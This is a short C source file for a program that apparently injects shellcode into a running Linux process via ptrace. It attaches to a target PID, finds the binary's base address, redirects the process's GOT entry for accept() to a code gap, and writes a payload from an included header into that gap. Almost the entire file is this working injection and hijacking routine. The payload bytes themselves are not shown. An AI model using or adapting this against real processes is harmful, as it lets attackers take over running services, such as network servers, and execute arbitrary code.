#include <seg_gaps.h>
#include "got_offset.h"
#include "inject_code.h"
#include "log.h"
#include "proc_map.h"
#include "trace.h"
// clang-format off
#include <iso646.h>
#include <sys/ptrace.h>
#include <linux/ptrace.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <fcntl.h>
// clang-format on

#define PADDING 0x10

int
main (int argc, char **argv)
{
  if (argc != 2)
    PEXIT ("usage: injector pid");
  uint32_t pid = strtol (argv[1], NULL, 0);

  attach (pid);
  ptrace (PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);

  uint64_t elf_base = parse_maps (pid, "r--p");
  // uint64_t rx_start = parse_maps (pid, "r-xp");
  // uint64_t rw_start = parse_maps (pid, "rw-p");
  uint64_t shellcode_start = elf_base + rx_gap_start;
  uint64_t accept_got = elf_base + accept_offset;

  copy_to_traee (pid, accept_got, (char *)&shellcode_start, 0x8);
  // copy shellcode_start to accept_got

  uint32_t len = sizeof (inject_code) - 1;
  copy_to_traee (pid, shellcode_start, inject_code, len);

  detach (pid);
}
